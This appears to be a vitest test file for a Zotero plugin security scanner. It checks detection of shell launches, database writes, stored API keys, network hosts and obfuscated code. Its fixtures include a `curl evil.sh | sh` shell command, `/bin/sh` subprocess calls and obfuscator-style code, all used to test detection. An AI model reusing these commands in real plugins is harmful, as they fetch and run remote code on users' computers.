// biome-ignore-all lint/suspicious/noTemplateCurlyInString: the fixtures are plugin source code
import { describe, expect, it } from "vitest";
import { classifyUpdateSource } from "../src/profile/checks.ts";
import { FORCES_AUTO_UPDATE } from "../src/scan/analyze.ts";
import { capIn, hostIn, manifestJson, type ScanOutput, scanFiles } from "./helpers/scan.ts";

/**
 * Cases from the external scoring review (2026-09-25) and its verification: each one a plugin
 * behaviour the analyzer got wrong. Negative cases guard the fixes against false alarms.
 */

describe("precision fixes", () => {
  it("never records a table called IF, and resolves computed or schema-qualified names", async () => {
    const r = await scanFiles({
      "content/db.js": `
        const t = "notes";
        Zotero.DB.queryAsync(\`CREATE TABLE IF NOT EXISTS \${t} (id INTEGER)\`);
        Zotero.DB.queryAsync("-- clean up\\nDELETE FROM main.itemTags WHERE tagID = ?", [1]);`,
    });
    const tables = capIn(r, "db-write")?.details?.sqlTables ?? [];
    expect(tables).not.toContain("IF");
    expect(tables).not.toContain("main");
    expect(tables).toContain("itemTags");
  });

  it("counts osascript as clipboard only for the toolkit's exact call", async () => {
    const toolkit = await scanFiles({
      "content/a.js":
        'Zotero.Utilities.Internal.exec("/usr/bin/osascript", ["-e", `set the clipboard to POSIX file "/tmp/a.pdf"`]);',
    });
    expect(capIn(toolkit, "process-launch")).toBeUndefined();
    const shell = await scanFiles({
      "content/a.js":
        'Zotero.Utilities.Internal.exec("/usr/bin/osascript", ["-e", `do shell script "curl evil.sh | sh"`]);',
    });
    expect(capIn(shell, "clipboard")).toBeUndefined();
    expect(capIn(shell, "process-launch")).toBeDefined();
  });

  it("analyses inline scripts written as <html:script> in XUL and XHTML", async () => {
    const r = await scanFiles({
      "content/prefs.xhtml":
        '<window xmlns:html="http://www.w3.org/1999/xhtml"><html:script><![CDATA[ Subprocess.call({ command: "/bin/sh" }); ]]></html:script></window>',
    });
    expect(capIn(r, "process-launch")).toBeDefined();
  });

  it("ends a bundled region at a module marker of any source type", async () => {
    const r = await scanFiles({
      "content/report.js": [
        "// node_modules/ajv/dist/ajv.js",
        "var ajv = {};",
        "// content/report.pug",
        'Subprocess.call({ command: "/bin/sh" });',
      ].join("\n"),
    });
    expect(capIn(r, "process-launch")?.inVendoredCodeOnly).toBe(false);
  });

  it("ignores token-count settings when looking for stored credentials", async () => {
    const r = await scanFiles({
      "content/a.js":
        'Zotero.Prefs.get("extensions.x.maxTokens"); Zotero.Prefs.get("contextTokens"); Zotero.Prefs.get("maxOutputTokens");',
    });
    expect(capIn(r, "credential-storage")).toBeUndefined();
    const key = await scanFiles({ "content/a.js": 'Zotero.Prefs.get("extensions.x.apiKey");' });
    expect(capIn(key, "credential-storage")).toBeDefined();
  });

  it("keeps a default server returned by a base-address helper (sumno-zotero)", async () => {
    const r = await scanFiles({
      "content/a.js": `const PREF_API_BASE = "extensions.sumno.apiBase"; const DEFAULT_API_BASE = "https://www.sumno-fixture.com.br";
        function getApiBase() { return Zotero.Prefs.get(PREF_API_BASE, true) || DEFAULT_API_BASE; }
        async function sync() { const url = \`\${getApiBase()}/api/v1/library\`; return fetch(url, { method: "GET" }); }
        const info = { apiURL: "https://api.unrelated-fixture.org/items" };`,
    });
    expect(hostIn(r, "www.sumno-fixture.com.br")?.usage).toBe("request");
    expect(hostIn(r, "api.unrelated-fixture.org")?.usage).not.toBe("request");
  });

  it("finds a key saved in a loop over setting names (paper-assistant-next)", async () => {
    const r = await scanFiles({
      "content/a.js": `function saveConfig(c) { for (const key of ["endpoint", "model", "apiKey"]) Zotero.Prefs.set("extensions.pan." + key, c[key], true); }`,
    });
    expect(capIn(r, "credential-storage")?.details?.prefKeys).toEqual(["extensions.pan.apiKey"]);
  });

  it("doesn't take an input-stream pump for a server open to the network (zotero-zotcloud)", async () => {
    const r = await scanFiles({
      "content/a.js": `const serverSocket = Cc["@mozilla.org/network/server-socket;1"].createInstance(Ci.nsIServerSocket);
        serverSocket.init(port, true, 1);
        const pump = Cc["@mozilla.org/network/input-stream-pump;1"].createInstance(Ci.nsIInputStreamPump);
        pump.init(inputStream, 0, 0, false);`,
    });
    expect(r.card.capabilities).toContainEqual({ id: "own-server", concern: "low" });
  });

  it("finds a key saved inside a settings object (paperzorro)", async () => {
    const r = await scanFiles({
      "content/a.js": `const s = { model: m, apiKey: $("set-key").value.trim() }; Zotero.Prefs.set("extensions.x.settings", JSON.stringify(s), true);`,
    });
    expect(capIn(r, "credential-storage")).toBeDefined();
  });

  it("counts keys named after the service they unlock, not item keys", async () => {
    const service = await scanFiles({
      "prefs.js": 'pref("extensions.metadatarepair.openAlexKey", "");',
    });
    expect(capIn(service, "credential-storage")?.details?.prefKeys).toEqual([
      "extensions.metadatarepair.openAlexKey",
    ]);
    const items = await scanFiles({
      "content/a.js":
        'Zotero.Prefs.get("extensions.x.sortKey"); Zotero.Prefs.get("citationKey"); Zotero.Prefs.get("emailKey");',
    });
    expect(capIn(items, "credential-storage")).toBeUndefined();
  });

  it("drops placeholder hosts and truncated addresses but keeps decimal IPs", async () => {
    const r = await scanFiles({
      "content/a.js": `
        const a = "https://your-resource.openai.azure.com/v1";
        const b = "https://api.example.com/v1";
        const local = u.startsWith("http://127.");
        fetch("http://1945917860/collect");`,
    });
    expect(hostIn(r, "your-resource.openai.azure.com")).toBeUndefined();
    expect(hostIn(r, "api.example.com")).toBeUndefined();
    expect(hostIn(r, "0.0.0.127")).toBeUndefined();
    expect(hostIn(r, "115.252.89.164")?.flags).toContain("ip-literal");
  });

  it("classifies IPv6 loopback and link-local addresses as this computer or the local network", async () => {
    const r = await scanFiles({
      "content/a.js": 'fetch("http://[::1]:8080/api"); fetch("http://169.254.1.1/x");',
    });
    expect(hostIn(r, "::1")?.category).toBe("localhost");
    expect(hostIn(r, "169.254.1.1")?.category).toBe("localhost");
  });
});

describe("hybrid files (install.rdf and manifest.json)", () => {
  const rdf = `<?xml version="1.0"?><RDF xmlns="http://www.w3.org/1999/02/22-rdf-syntax-ns#" xmlns:em="http://www.mozilla.org/2004/em-rdf#"><Description about="urn:mozilla:install-manifest"><em:id>fixture@example.org</em:id><em:name>Fixture</em:name><em:version>__buildVersion__</em:version><em:targetApplication><Description><em:id>zotero@chnm.gmu.edu</em:id><em:minVersion>5.0</em:minVersion><em:maxVersion>6.*</em:maxVersion></Description></em:targetApplication></Description></RDF>`;

  it("reads the version and update address from manifest.json, which Zotero 7+ uses", async () => {
    const r = await scanFiles(
      { "install.rdf": rdf },
      {
        rawManifest: manifestJson(
          { update_url: "https://raw.githubusercontent.com/o/r/main/update.json" },
          { version: "1.7.2" },
        ),
      },
    );
    expect(r.analysis.input.version).toBe("1.7.2");
    const upd = capIn(r, "self-update");
    expect(upd?.details?.updateUrl).toBe("https://raw.githubusercontent.com/o/r/main/update.json");
    expect(upd?.evidence[0]?.file).toBe("manifest.json");
    expect(upd?.evidence[0]?.snippet).toContain("update.json");
  });
});

describe("coverage: skipped or unparsed code never lowers the label", () => {
  const risky =
    'Subprocess.call({ command: "/bin/sh" }); fetch("https://collect.unknown-host.io/x");';

  it("parses old `for each` loops instead of falling back", async () => {
    const r = await scanFiles({
      "chrome/content/ql.js": `for each (var f in files) { f.launch(); }\nvar p = Components.classes["@mozilla.org/process/util;1"].createInstance(Components.interfaces.nsIProcess);`,
    });
    expect(r.analysis.coverage.parseFailures).toEqual([]);
    expect(capIn(r, "process-launch")).toBeDefined();
  });

  it("finds capabilities in a file the parser can't read", async () => {
    const r = await scanFiles({
      "content/broken.js": `reader.onload(e) = function () {};
        var p = Cc["@mozilla.org/process/util;1"].createInstance(Ci.nsIProcess);
        Zotero.Utilities.Internal.exec("/bin/sh", ["-c", cmd]);
        Services.logins.findLogins("x", "", "");
        Zotero.DB.queryAsync("DELETE FROM itemTags WHERE tagID = ?", [1]);
        // https://commented-out.example-host.io/api`,
    });
    expect(r.analysis.coverage.parseFailures).toHaveLength(1);
    expect(capIn(r, "process-launch")?.details?.apis).toEqual(
      expect.arrayContaining(["nsIProcess", "Zotero.Utilities.Internal.exec"]),
    );
    expect(capIn(r, "login-manager")).toBeDefined();
    expect(capIn(r, "db-write")?.details?.sqlTables).toContain("itemTags");
    expect(hostIn(r, "commented-out.example-host.io")).toBeUndefined();
  });

  it("gives no label when a code file is too large to analyse", async () => {
    const pad = new Uint8Array(65 * 1024 * 1024).fill(32);
    const r = await scanFiles({ "content/main.js": risky, "content/big.js": pad });
    expect(r.analysis.coverage.filesSkipped).toContainEqual({
      path: "content/big.js",
      reason: "too-large",
    });
    expect(r.card.label).toBe("insufficient-data");
  });

  it("weighs parse failures by bytes and counts each file once", async () => {
    const big = `var x = 1;\n${"Zotero.debug('ok');\n".repeat(2000)}`;
    const page = `<html><script>var = ;</script><script>also broken(</script></html>`;
    const small = await scanFiles({ "content/main.js": big, "content/prefs.xhtml": page });
    expect(small.analysis.coverage.parseFailures).toHaveLength(1);
    expect(small.card.label).not.toBe("insufficient-data");
    const mostly = await scanFiles({
      "content/main.js": "var ok = 1;",
      "content/broken.js": `${"var a = ;\n".repeat(200)}`,
    });
    expect(mostly.card.label).toBe("insufficient-data");
  });

  it("ignores a few zero-width spaces inside string data, but not a long run or code", async () => {
    const zw = "​".repeat(4);
    const data = await scanFiles({
      "content/data.js": `var t = { "urogynecology${zw} (online)": 1 };`,
    });
    expect(data.card.suspiciousUnicode).toBe(false);
    const payload = await scanFiles({ "content/a.js": `var t = "${"​".repeat(40)}";` });
    expect(payload.card.suspiciousUnicode).toBe(true);
    const code = await scanFiles({ "content/a.js": `var admin${zw} = true;` });
    expect(code.card.suspiciousUnicode).toBe(true);
  });
});

describe("bundled libraries attribute findings but never hide medium or high ones", () => {
  it("treats a lib/ file with no sign of a library as the plugin's own code", async () => {
    const r = await scanFiles({
      "content/lib/ocr.js": 'Subprocess.call({ command: "/bin/sh" });',
    });
    expect(capIn(r, "process-launch")?.inVendoredCodeOnly).toBe(false);
    expect(r.card.label).toBe("review-details");
  });

  it("keeps a program launch in a file with a library banner or a library's name", async () => {
    const banner = await scanFiles({
      "content/lib/helper.js": '/*! helper v1 | MIT */\nSubprocess.call({ command: "/bin/sh" });',
    });
    expect(banner.card.label).toBe("review-details");
    const named = await scanFiles({
      "content/katex.js": 'Subprocess.call({ command: "/bin/sh" });',
    });
    expect(named.card.label).toBe("review-details");
  });

  it("keeps a program launch placed after a self-written node_modules marker", async () => {
    const r = await scanFiles({
      "bootstrap.js": '// node_modules/left-pad/index.js\nSubprocess.call({ command: "/bin/sh" });',
    });
    expect(r.card.label).toBe("review-details");
  });

  it("recognises libraries in minified bundles, sibling checkouts and release files", async () => {
    // esbuild's minified wrapper: only the wrapper is the toolkit, not the code after it.
    const esbuild = await scanFiles({
      "content/index.js": `var require_x=__commonJS({"node_modules/zotero-plugin-toolkit/dist/utils/clipboard.js"(e){navigator.clipboard.writeText(e)}});Zotero.Prefs.get("extensions.x.apiKey");`,
    });
    expect(capIn(esbuild, "clipboard")?.libraries).toEqual(["zotero-plugin-toolkit"]);
    expect(capIn(esbuild, "credential-storage")?.inVendoredCodeOnly).toBe(false);
    const sibling = await scanFiles({
      "content/index.js": `// ../zotero-plugin-toolkit/dist/utils/clipboard.js\nnavigator.clipboard.writeText(t);\n// src/index.ts\nconst x = 1;`,
    });
    expect(capIn(sibling, "clipboard")?.libraries).toEqual(["zotero-plugin-toolkit"]);
    const vue = await scanFiles({
      "content/modules/vue.global.prod.js": `var Vue=function(e){navigator.clipboard.writeText(e)};`,
    });
    expect(capIn(vue, "clipboard")?.libraries).toEqual(["vue"]);
  });

  it("keeps the toolkit's link bridges when an obfuscator hides their keys (rockcor)", async () => {
    const r = await scanFiles({
      "content/a.js": `var d=_0xw({'node_modules/zotero-plugin-toolkit/dist/utils/debugBridge.js'(e){var h={noContent:!0,doAction:async function(u){this[_0x1(0xd47)](u)},newChannel:function(u){this.doAction(u)}};Services['io'][_0x1(0xf7e)](_0x1(0xd5f))[_0x1(0x1)]['_extensions'][_0x1(0xf9d)]=h;D['version']=0x2;}}),p=_0xw({'node_modules/zotero-plugin-toolkit/dist/utils/pluginBridge.js'(e){async function i(u){const x=await AddonManager['getInstallForURL'](u);x['install']();}}});`,
    });
    expect(capIn(r, "link-runs-code")?.details?.asksFirst).toBe(true);
    expect(capIn(r, "link-installs-addons")?.details?.asksFirst).toBe(false);
    expect(capIn(r, "installs-addons")).toBeUndefined();
  });

  it("still flags obfuscated code in a file named like a library", async () => {
    const ids = Array.from({ length: 80 }, (_, i) => `var _0x${(0xa00 + i).toString(16)} = ${i};`);
    const rotate = `(function (a, n) { while (--n) { a['push'](a['shift']()); } })(_0xa00, 9);`;
    const r = await scanFiles({ "content/lodash.js": `${ids.join("\n")}\n${rotate}` });
    expect(r.card.obfuscated).toBe(true);
    expect(r.card.label).toBe("high-concern");
  });
});

describe("obfuscation tiers", () => {
  const ids = (n: number, from = 0xa00) =>
    Array.from({ length: n }, (_, i) => `var _0x${(from + i).toString(16)} = ${i};`).join("\n");
  const rotate = `(function (a, n) { while (--n) { a['push'](a['shift']()); } })(_0xa00, 9);`;
  const confidence = (r: Awaited<ReturnType<typeof scanFiles>>) =>
    r.analysis.transparency.obfuscation.detected
      ? r.analysis.transparency.obfuscation.confidence
      : "none";

  it("calls two kinds of structural signal obfuscation, with high confidence", async () => {
    const r = await scanFiles({ "content/index.js": `${ids(80)}\n${rotate}` });
    expect(confidence(r)).toBe("high");
    expect(r.card.drivers).toContain("ST-OBFUSCATED");
  });

  it("needs a second file or dense escapes to back a single kind of signal", async () => {
    const two = await scanFiles({ "content/a.js": ids(80), "content/b.js": ids(80, 0xb00) });
    expect(confidence(two)).toBe("medium");
    expect(two.card.label).toBe("high-concern");
    const one = await scanFiles({ "content/a.js": ids(80) });
    expect(confidence(one)).toBe("low");
    expect(one.card.obfuscated).toBe(false);
    expect(one.card.drivers).toContain("ST-OBFUSCATION-POSSIBLE");
    expect(one.card.label).toBe("review-details");
    expect(one.analysis.transparency.verdict).not.toBe("obfuscated");
  });

  it("treats dense escapes alone as a hint, not obfuscation", async () => {
    const ascii = Array.from({ length: 200 }, () => '"\\x68\\x74\\x74\\x70"').join(",");
    const r = await scanFiles({ "content/o.js": `var t = [${ascii}];` });
    expect(confidence(r)).toBe("low");
    expect(r.card.label).toBe("review-details");
  });

  it("finds obfuscator signatures in code, not in comments or prose", async () => {
    const selfDefending = `a['toString']()[q(0x6c2)]('(((.+)+)+)+$')[q(0x10)]();`;
    const real = await scanFiles({ "content/index.js": selfDefending });
    expect(real.analysis.transparency.obfuscation.signals.map((s) => s.kind)).toEqual([
      "obfuscator-signature",
    ]);
    const prose = await scanFiles({
      "content/index.js": `// protected with jsjiami.com and sojson.v5, see (((.+)+)+)+$
        const help = "We don't use jscrambler or jsjiami.com";`,
    });
    expect(prose.analysis.transparency.obfuscation.signals).toEqual([]);
  });
});

describe("database writes through variables and aliases", () => {
  const tables = (r: Awaited<ReturnType<typeof scanFiles>>) =>
    capIn(r, "db-write")?.details?.sqlTables ?? [];

  it("follows a connection stored on the plugin object (manual-sort)", async () => {
    const r = await scanFiles({
      "content/sort.js": `
        class Sorter {
          init(ports) { this.db = ports.db ?? this.zotero?.DB; }
          async save(id) { await this.db.queryAsync("UPDATE collectionItems SET orderIndex=? WHERE itemID=?", [1, id]); }
        }`,
    });
    expect(tables(r)).toContain("collectionItems");
    expect(r.card.label).toBe("high-concern");
  });

  it("resolves SQL held in a variable, a constant table name and a list of statements", async () => {
    const r = await scanFiles({
      "content/a.js": `
        async function clear() { const sql = "DELETE FROM itemTags WHERE tagID = ?"; await Zotero.DB.queryAsync(sql, [1]); }
        const TABLE = "translation_history";
        const SCHEMA = \`CREATE TABLE IF NOT EXISTS \${TABLE} (id INTEGER)\`;
        async function setup() { await Zotero.DB.queryAsync(SCHEMA); await Zotero.DB.queryAsync(\`INSERT INTO \${TABLE} VALUES (?)\`, [1]); }
        const CREATE_SQL = ["CREATE TABLE IF NOT EXISTS threads (id)", "CREATE INDEX t_i ON threads (id)"];
        async function migrate() { for (const sql of CREATE_SQL) await Zotero.DB.queryAsync(sql); }
        async function count() { return Zotero.DB.valueQueryAsync("UPDATE settings SET value = 1 WHERE setting = 'x'"); }`,
    });
    expect(tables(r)).toEqual(
      expect.arrayContaining(["itemTags", "translation_history", "threads", "settings"]),
    );
  });

  it("follows an alias of Zotero.DB and a function that returns it", async () => {
    const r = await scanFiles({
      "content/a.js": `
        const db = Zotero.DB;
        db.queryAsync("DELETE FROM itemTags WHERE tagID = 1");
        function getDB() { return Zotero.DB; }
        async function save() { const d = getDB(); await d.queryAsync("CREATE TABLE IF NOT EXISTS notes2 (id)"); }`,
    });
    expect(tables(r)).toEqual(expect.arrayContaining(["itemTags", "notes2"]));
  });

  it("uses the nearest function's binding, not one from an unrelated function", async () => {
    const r = await scanFiles({
      "content/a.js": `
        function a() { const sql = "SELECT version FROM version"; return Zotero.DB.queryAsync(sql); }
        function b() { const sql = "INSERT INTO myCache VALUES (1)"; return 0; }`,
    });
    expect(capIn(r, "db-write")).toBeUndefined();
  });

  it("leaves the plugin's own database alone, even when the file also returns Zotero.DB (zoplicate)", async () => {
    const r = await scanFiles({
      "content/a.js": `
        class Store { constructor() { this._db = new Zotero.DBConnection("zoplicate"); }
          async add() { await this._db.queryAsync("INSERT INTO duplicates VALUES (?)", [1]); } }
        function zoteroDb() { return Zotero.DB; }`,
    });
    expect(capIn(r, "db-write")).toBeUndefined();
  });

  it("recognises an aliased DBConnection constructor as the plugin's own database (zotero-gpt)", async () => {
    const r = await scanFiles({
      "content/a.js": `
        let r = Zotero.DBConnection;
        const conn = new r("zoterogpt");
        conn.queryAsync("CREATE TABLE IF NOT EXISTS chats (id)");
        this.DB = conn;
        this.DB.queryAsync("INSERT INTO chats VALUES (1)");`,
    });
    expect(capIn(r, "db-write")).toBeUndefined();
  });
});

describe("hosts in template-literal URLs", () => {
  it("keeps the host when the URL's host ends before the first expression", async () => {
    const r = await scanFiles({
      "content/a.js":
        "fetch(`https://api.openai.com/v1/models?key=${k}`); fetch(`http://127.0.0.1:${port}/api`);",
    });
    expect(hostIn(r, "api.openai.com")?.usage).toBe("request");
    expect(hostIn(r, "127.0.0.1")?.category).toBe("localhost");
    expect(r.card.dataSharing).toBe("named-third-parties");
  });

  it("never invents a host from a cut-off name or address", async () => {
    const r = await scanFiles({
      "content/a.js":
        "fetch(`https://api.${d}/x`); fetch(`https://translate.google${t}`); fetch(`http://127.${o}`); fetch(`https://api.openalex.org${p}`);",
    });
    const hosts = r.analysis.network.hosts.map((h) => h.host);
    expect(hosts).toEqual(["api.openalex.org"]);
  });

  it("surfaces telemetry and bare IPs hidden in templates (immersivetranslate, Green Frog)", async () => {
    const ga = await scanFiles({
      "content/a.js":
        "const HOST_NAME = 'immersivetranslate.com'; function report(e) { fetch(`https://www.google-analytics.com/mp/collect?measurement_id=${id}&api_secret=${s}`, { method: 'POST' }); fetch(`https://analytics.${HOST_NAME}/collect`, { method: 'POST' }); }",
    });
    expect(ga.card.drivers).toContain("DS-TELEMETRY");
    expect(hostIn(ga, "analytics.immersivetranslate.com")?.usage).toBe("request");
    const ip = await scanFiles({
      "content/a.js":
        "Zotero.HTTP.request('GET', `http://121.196.229.180:8080/v1/journals/cnki/${encodeURI(t)}`);",
    });
    expect(ip.card.dataSharing).toBe("unknown-endpoints");
  });

  it("makes no data-sharing claim from a link template in a plugin with no network code", async () => {
    const r = await scanFiles({
      "content/a.js": "const link = `https://doi.org/${doi}`; item.setField('url', link);",
    });
    expect(r.card.dataSharing).toBe("no-network-found");
  });

  it("keeps public file drops and open proxies a concern", async () => {
    const r = await scanFiles({
      "content/a.js": "fetch('https://filebin.net/abc/log.zip', { method: 'POST', body: zip });",
    });
    expect(r.card.drivers).toContain("DS-PUBLIC-RELAY");
    expect(r.card.label).toBe("review-details");
  });
});

describe("network activity we used to miss", () => {
  const apis = (r: Awaited<ReturnType<typeof scanFiles>>) =>
    r.analysis.network.apis.map((a) => a.api);

  it("sees fetch on a window object and through .fetch.call", async () => {
    const win = await scanFiles({
      "content/a.js":
        "const win = Zotero.getMainWindow(); win.fetch('https://collect.unknown-host.io/x', { method: 'POST' });",
    });
    expect(win.card.dataSharing).toBe("unknown-endpoints");
    const sdk = await scanFiles({
      "content/a.js":
        "class Client { constructor(o) { this.fetch = o.fetch ?? fetch; } send(init) { return this.fetch.call(void 0, 'https://api.anthropic.com/v1/messages', init); } }",
    });
    expect(hostIn(sdk, "api.anthropic.com")?.usage).toBe("request");
  });

  it("follows fetch passed as a value (default parameters, ?? fallbacks, stored on this)", async () => {
    const r = await scanFiles({
      "content/a.js": `
        class Llm { constructor(settings, fetchImpl = fetch) { this.fetchImpl = fetchImpl; }
          ask() { return this.fetchImpl("https://api.deepseek.com/chat/completions", { method: "POST" }); } }
        function probe(deps) { const f = deps.fetch ?? globalThis.fetch; return f(\`https://api.openai.com/v1/models\`); }`,
    });
    expect(apis(r)).toContain("fetch");
    expect(hostIn(r, "api.deepseek.com")?.usage).toBe("request");
    expect(hostIn(r, "api.openai.com")?.usage).toBe("request");
  });

  it("sees lowercase zotero.HTTP aliases and aliased XMLHttpRequest constructors", async () => {
    const r = await scanFiles({
      "content/a.js": `
        function run(zotero) { return zotero.HTTP.request("GET", "https://dblp.timetrap.workers.dev/q"); }
        const xhr = new (resolveRuntimeGlobal("XMLHttpRequest"))();`,
    });
    expect(apis(r)).toEqual(expect.arrayContaining(["zotero-http", "xhr"]));
    expect(hostIn(r, "dblp.timetrap.workers.dev")?.usage).toBe("request");
  });

  it("names Zotero's lookup services instead of saying there is no network access", async () => {
    const r = await scanFiles({
      "content/a.js":
        "const t = new Zotero.Translate.Search(); t.setIdentifier({ DOI: doi }); await t.translate();",
    });
    expect(r.card.dataSharing).toBe("named-third-parties");
    expect(r.card.hostsByCategory.zotero).toContain("Zotero lookup services");
  });

  it("counts a web page loaded into a browser the plugin created", async () => {
    const r = await scanFiles({
      "content/a.js":
        'const browser = doc.createXULElement("browser"); browser.setAttribute("src", "https://gemini.google.com/app");',
    });
    expect(apis(r)).toContain("remote-page");
    expect(hostIn(r, "gemini.google.com")?.usage).toBe("request");
  });

  it("doesn't count requests for the plugin's own files", async () => {
    const r = await scanFiles({
      "bootstrap.js": `
        function startup({ rootURI }) { fetch(rootURI + "pandoc-citekey.js"); }
        async function page(p) { const src = \`chrome://watch/content/docs/\${p}\`; return fetch(src); }
        Zotero.HTTP.request("GET", "resource://zotero/schema/global/schema.json");`,
    });
    expect(r.analysis.network.apis).toEqual([]);
    expect(r.card.dataSharing).toBe("no-network-found");
  });

  it("points at Zotero's sync server when a plugin sets it to a fixed host (Nutstore)", async () => {
    const r = await scanFiles({
      "content/a.js": `
        function getWebdavUrl() { return env === "dev" ? "dav-demo.jianguoyun.com/dav" : "dav.jianguoyun.com/dav"; }
        Zotero.Prefs.set("sync.storage.url", getWebdavUrl());`,
    });
    expect(hostIn(r, "dav.jianguoyun.com")?.usage).toBe("request");
  });

  it("resolves a base URL returned by a small helper (the-cite-shop)", async () => {
    const r = await scanFiles({
      "content/a.js": `
        var DEFAULT_API_BASE = "https://theciteshop.com/wp-json/theciteshop/v1";
        function getApiBase() { return DEFAULT_API_BASE; }
        zotero.HTTP.request("POST", \`\${getApiBase()}/license/validate\`, { body });`,
    });
    expect(hostIn(r, "theciteshop.com")?.usage).toBe("request");
  });

  it("ignores pdf.js-style fetch methods, data URLs and a local function called fetch", async () => {
    const r = await scanFiles({
      "content/a.js": `
        const obj = xref.fetch(ref); const v = cache.fetch(key);
        win.fetch("data:image/png;base64,AAAA");
        function fetch(key, children) { return children[key]; }
        fetch("summary", children);`,
    });
    expect(r.analysis.network.apis).toEqual([]);
  });
});

describe("network paths found while checking the regression report", () => {
  it("still counts calls to a fetch polyfill that sends the request itself (nanopub)", async () => {
    const r = await scanFiles({
      "content/a.js": `
        if (typeof fetch === "undefined") { fetch = async function (url, o) { const xhr = new XMLHttpRequest(); xhr.open("GET", url); }; }
        fetch("https://np.knowledgepixels.com/");`,
    });
    expect(hostIn(r, "np.knowledgepixels.com")?.usage).toBe("request");
  });

  it("never lets an object property decide what a variable holds (mineru-to-zotero)", async () => {
    const r = await scanFiles({
      "content/a.js": `
        const icon = { url: "chrome://mineru/content/icon.png" };
        async function send(method, url) { return Zotero.HTTP.request(method, url, {}); }`,
    });
    expect(r.analysis.network.apis.map((a) => a.api)).toContain("zotero-http");
  });

  it("follows a helper that picks a fetch, and aliases of Zotero.HTTP.request", async () => {
    const r = await scanFiles({
      "content/a.js": `
        function resolveFetch() { const c = [globalThis.fetch]; for (const fn of c) if (fn) return fn; }
        async function chat() { const doFetch = resolveFetch(); return doFetch("https://api.openai.com/v1/chat/completions"); }
        async function requestJSON(method, url) { const request = Zotero.HTTP.request; return request.call(Zotero.HTTP, method, url); }
        requestJSON("POST", "https://api.moonshot.cn/v1/chat/completions");`,
    });
    expect(hostIn(r, "api.openai.com")?.usage).toBe("request");
    expect(r.analysis.network.apis.map((a) => a.api)).toContain("zotero-http");
  });

  it("counts a fetch method called with a URL, not pdf.js or KaTeX fetch methods", async () => {
    const r = await scanFiles({
      "content/a.js":
        "async function speak(deps) { return deps.fetch(`${base()}/v1/audio/speech`, { method: 'POST' }); }",
    });
    expect(r.analysis.network.apis.map((a) => a.api)).toContain("fetch");
    const lib = await scanFiles({
      "content/a.js": "var r = parser.fetch().text; var o = this.xref.fetch(ref);",
    });
    expect(lib.analysis.network.apis).toEqual([]);
  });

  it("treats data URLs passed in and chrome pages loaded into a frame as local", async () => {
    const r = await scanFiles({
      "content/a.js": `
        async function copyImage(win, dataURL) { const res = await win.fetch(dataURL); return res.blob(); }
        const WORKSPACE_URI = "chrome://goodnote/content/workspace.xhtml";
        frame.loadURI(Services.io.newURI(WORKSPACE_URI), {});`,
    });
    expect(r.analysis.network.apis).toEqual([]);
  });

  it("never builds a host from an empty substitution", async () => {
    const r = await scanFiles({
      "content/a.js":
        'const region = ""; fetch(`https://bedrock-runtime.${region}.amazonaws.com/model`);',
    });
    expect(r.analysis.network.hosts.map((h) => h.host)).toEqual([]);
  });
});

describe("developer defaults are not servers you configure", () => {
  it("treats a prefs.js default address as where data goes (fanyipaiban)", async () => {
    const r = await scanFiles({
      "prefs.js": 'pref("extensions.x.serverUrl", "https://collect.unknown-host.io/v1");',
      "content/a.js":
        'const base = Zotero.Prefs.get("extensions.x.serverUrl"); fetch(base + "/pdf/tasks", { method: "POST" });',
    });
    expect(r.card.dataSharing).toBe("unknown-endpoints");
  });

  it("treats a hard-coded fallback the same way", async () => {
    const r = await scanFiles({
      "content/a.js":
        'const base = Zotero.Prefs.get("extensions.x.serverUrl") || "https://collect.unknown-host.io"; fetch(base, { method: "POST" });',
    });
    expect(r.card.dataSharing).toBe("unknown-endpoints");
  });

  it("doesn't take a user name, port or switch for a server setting (zotero-addons)", async () => {
    const r = await scanFiles({
      "content/a.js": `
        Zotero.Prefs.get("extensions.zotero.sync.server.username");
        Zotero.Prefs.get("httpServer.port"); Zotero.Prefs.get("subs.removeURLs");
        fetch(\`https://ghfast.top/https://github.com/\${repo}/releases/latest/download/a.xpi\`);`,
    });
    expect(r.analysis.network.configurableEndpoints).toEqual([]);
    expect(r.card.drivers).toContain("DS-PUBLIC-RELAY");
  });

  it("keeps a genuinely user-set server as 'servers you configure'", async () => {
    const r = await scanFiles({
      "content/a.js":
        'const url = Zotero.Prefs.get("extensions.flomo.apiUrl"); fetch(url, { method: "POST", body });',
    });
    expect(r.card.dataSharing).toBe("user-configured-only");
  });
});

describe("network code only in bundled libraries", () => {
  it("says so when only pdf.js has network code, instead of 'couldn't tell where'", async () => {
    const r = await scanFiles({
      "content/lib/pdf.js":
        "function load(url) { return fetch(url).then((r) => r.arrayBuffer()); }",
      "content/main.js": "Zotero.debug('reader');",
    });
    expect(r.card.dataSharing).toBe("bundled-library-only");
    expect(r.card.label).toBe("low-concern");
  });

  it("counts a bundled API client's service address as where data goes", async () => {
    const r = await scanFiles({
      "content/index.js": [
        "// node_modules/openai/client.mjs",
        'var DEFAULT = "https://api.openai.com/v1";',
        "class OpenAI { constructor(o) { this.baseURL = o.baseURL ?? DEFAULT; this.fetch = o.fetch ?? fetch; }",
        "  post(p, init) { return this.fetch.call(void 0, this.baseURL + p, init); } }",
        "// src/index.ts",
        "const client = new OpenAI({ apiKey });",
      ].join("\n"),
    });
    expect(r.card.dataSharing).toBe("named-third-parties");
    expect(r.card.hostsByCategory["llm-provider"]).toContain("api.openai.com");
  });

  it("doesn't call a request-making package 'library only' (zotero-plugin's debug-log sender)", async () => {
    const r = await scanFiles({
      "content/index.js": [
        "// node_modules/zotero-plugin/debug-log.js",
        "function send(url, zip) { return fetch(url, { method: 'POST', body: zip }); }",
        "// src/index.ts",
        "Zotero.debug('x');",
      ].join("\n"),
    });
    expect(r.card.dataSharing).toBe("unknown-endpoints");
  });
});

describe("remote scripts in pages", () => {
  it("flags a web script in one of the plugin's pages, but not a commented-out one", async () => {
    const r = await scanFiles({
      "content/dialog.xhtml":
        '<window><html:script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></html:script><!-- <script src="https://unpkg.com/old"></script> --></window>',
    });
    expect(capIn(r, "remote-script")?.details?.apis).toEqual(["cdn.jsdelivr.net"]);
    expect(hostIn(r, "unpkg.com")).toBeUndefined();
    // Zotero blocks web scripts in privileged pages (tested in Zotero 9): shown, not a concern.
    expect(r.card.capabilities).toContainEqual({ id: "remote-script", concern: "low" });
    expect(r.card.label).toBe("low-concern");
  });

  it("flags code that turns off one of Zotero's security settings", async () => {
    const r = await scanFiles({
      "content/a.js": `Services.prefs.setBoolPref("security.disallow_privileged_https_script_loads", false);`,
    });
